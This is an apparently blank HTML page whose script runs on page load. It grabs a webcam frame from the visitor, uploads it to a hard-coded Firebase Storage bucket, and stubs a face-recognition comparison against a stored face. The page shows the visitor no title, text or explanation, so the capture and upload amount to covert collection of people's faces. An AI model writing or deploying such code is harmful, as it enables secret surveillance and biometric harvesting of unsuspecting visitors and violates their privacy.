<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title></title>
<style>
body {
  font-family: Arial, sans-serif;
}

.container {
  text-align: center;
  margin-top: 50px;
}

button {
  padding: 10px 20px;
  font-size: 16px;
  background-color: #007bff;
  color: #fff;
  border: none;
  cursor: pointer;
}

#photo-preview {
  margin-top: 20px;
  max-width: 300px;
}
</style>
</head>
<body>
<div class="container">
  <h1></h1>
  <img id="photo-preview" src="#" alt="Your photo will appear here" style="display: none;">
</div>

<script src="https://www.gstatic.com/firebasejs/8.2.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.2.1/firebase-storage.js"></script>
<script>
// Initialize Firebase
const firebaseConfig = {
  apiKey: "AIzaSyBL2hddqUVVSUDbPB-6GP2CgFUkzWKa4Nk",
  authDomain: "comid-b75fd.firebaseapp.com",
  projectId: "comid-b75fd",
  storageBucket: "comid-b75fd.appspot.com",
  messagingSenderId: "1055136088878",
  appId: "1:1055136088878:web:c9b4fb7f1d2e52c18fb0bf",
  measurementId: "G-GV2QSP91JB"
};

firebase.initializeApp(firebaseConfig);

document.addEventListener("DOMContentLoaded", function() {
  const photoPreview = document.getElementById('photo-preview');

  // Take photo automatically when the page loads
  takePhoto().then(function(blob) {
    // Display the taken photo
    const imageUrl = URL.createObjectURL(blob);
    photoPreview.src = imageUrl;
    photoPreview.style.display = 'block';

    // Upload the photo to Firebase Storage
    uploadPhoto(blob).then(function() {
      // Check the uploaded photo against the stored face
      checkUploadedPhoto(blob);
    });
  });

  function takePhoto() {
    return new Promise(function(resolve, reject) {
      const constraints = { video: true };

      navigator.mediaDevices.getUserMedia(constraints)
        .then(function(stream) {
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();

          // Set timeout to capture photo after 1 second
          setTimeout(function() {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert the canvas content to blob
            canvas.toBlob(function(blob) {
              stream.getVideoTracks().forEach(function(track) {
                track.stop();
              });
              resolve(blob);
            }, 'image/jpeg');

          }, 1000); // Capture photo after 1 second
        })
        .catch(function(error) {
          reject(error);
        });
    });
  }

  function uploadPhoto(blob) {
    return new Promise(function(resolve, reject) {
      const storageRef = firebase.storage().ref();
      const photoRef = storageRef.child('photos/' + generateRandomString(10) + '.jpg');

      photoRef.put(blob).then(function(snapshot) {
        console.log('Uploaded a blob or file!');
        resolve();
      }).catch(function(error) {
        console.error('Error uploading file:', error);
        reject(error);
      });
    });
  }

  function checkUploadedPhoto(blob) {
    // Implement face recognition and comparison here
    // Example: Fetch the stored face embedding from Firebase Storage and compare it with the uploaded face
    // If the faces match, take appropriate action
    // Otherwise, take another action
    // For now, just console.log the uploaded blob for testing
    console.log('Uploaded blob:', blob);
  }

  function generateRandomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
  }
});
</script>
</body>
</html>
